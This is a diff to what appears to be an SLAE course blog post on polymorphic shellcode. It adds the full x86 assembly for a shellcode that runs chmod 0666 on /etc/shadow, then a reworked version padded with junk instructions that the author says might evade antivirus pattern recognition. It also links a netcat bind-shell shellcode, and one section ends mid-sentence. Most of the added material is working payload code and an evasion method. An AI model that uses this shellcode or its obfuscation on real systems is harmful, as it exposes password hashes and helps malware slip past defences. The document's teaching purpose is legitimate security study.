@@ -19,6 +19,8 @@ The first shellcode we will be transforming is the [netcat bindshell](http://she
 ```nasm
 ; netcat_bind_shell.nasm
 ;  - Listen on port 13377 using netcat and provide shell
+;
+; [LINK] http://shell-storm.org/shellcode/files/shellcode-804.php
 
     global _start
 
@@ -108,7 +110,78 @@ _start:
 
 The new shellcode is 85 bytes, about 37% more than the original 62 bytes.
 
-Next, we'll look at the 
+Next, we'll look at the [chmod 0666 /etc/shadow](http://shell-storm.org/shellcode/files/shellcode-556.php) shellcode, reproduced below:
+
+```nasm
+; chmod_etc_shadow.nasm
+;  - Execute chmod 0666 /etc/shadow and exit
+;
+; [LINK] http://shell-storm.org/shellcode/files/shellcode-556.php
+
+    global _start
+
+section .text
+_start:
+
+        xor eax,eax
+        push eax
+
+        push dword 0x776f6461   ; woda
+        push dword 0x68732f2f   ; hs//
+        push dword 0x6374652f   ; cte/
+        mov ebx,esp
+
+        push word 0x1b6
+        pop ecx
+
+        mov al,0xf              ; chmod
+        int 0x80
+
+        mov al,0x1              ; exit
+        int 0x80
+```
+
+With this shellcode we'll try a different approach by adding nop-equivalent operations to obfuscate the pattern.  My morphed shellcode is shown below:
+
+```nasm
+; chmod_etc_shadow.nasm
+;  - Execute chmod 0666 /etc/shadow and exit
+;
+; [LINK] http://shell-storm.org/shellcode/files/shellcode-556.php
+
+    global _start
+
+section .text
+_start:
+
+        sub ebx,ebx             ; xor eax,eax
+        xchg eax,ebx            ; ...
+        push eax
+
+        push dword 0x776f6461   ; woda
+        inc ebx
+        lea ebx, [ecx]
+        push dword 0x68732f2f   ; hs//
+        push ecx
+        add esp, 4
+        push dword 0x6374652f   ; cte/
+        mov ebx,esp
+        mov ecx, eax
+
+        push word 0x1b6
+        pop ecx
+
+        mov al,0x10             ; chmod
+        dec eax
+        int 0x80
+
+        mov al,0x1              ; exit
+        int 0x80
+```
+
+As you can see, we've obfuscated the placement of "/etc//shadow" on the stack by intermixing it with non-interactive operations.  Even though this may not seem as effective as the constant-addition method we used before, it only increased the shellcode by 11 bytes and still might avoid pattern recognition from antivirus.
+
+Finally, we'll take a look at the 
 
 You can find the all the code to this challenge at [https://github.com/johneiser/SLAE/tree/master/assignments/Assignment_6](https://github.com/johneiser/SLAE/tree/master/assignments/Assignment_6).
 
